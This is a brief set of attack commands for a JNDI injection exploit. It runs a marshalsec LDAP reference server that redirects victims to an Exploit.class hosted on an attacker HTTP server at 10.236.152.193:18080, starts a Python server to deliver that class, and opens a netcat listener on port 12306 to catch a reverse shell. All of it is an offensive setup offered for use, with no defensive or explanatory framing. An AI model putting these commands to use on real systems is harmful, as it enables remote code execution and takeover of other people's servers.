### open ldap server
``java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer http://10.236.152.193:18080/#Exploit 1389``
### open http server,   provide  Exploit.class download
python3 -m http.server 18080
### shell 反射
nc -lvvp 12306
